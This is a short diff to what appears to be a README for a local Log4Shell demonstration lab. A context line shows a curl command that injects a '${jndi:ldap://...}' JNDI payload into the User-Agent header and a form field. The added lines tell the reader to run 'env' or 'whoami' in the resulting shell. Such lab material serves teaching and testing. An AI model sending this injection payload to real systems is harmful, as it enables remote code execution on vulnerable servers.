@@ -63,7 +63,10 @@ curl -v -A "\${jndi:ldap://localhost:1389/a}" -X POST -d uname="\${jndi:ldap://l
 * upload completely sent off: 37 out of 37 bytes  
 ```  
 
-Step 5) Profit!!
+Step 5) Profit!!  
+
+In terminal 1, type 'env' or 'whoami' and have a biscotti ... you earned it!  
+
 
 
 Once it is running, you can access it on localhost:8080
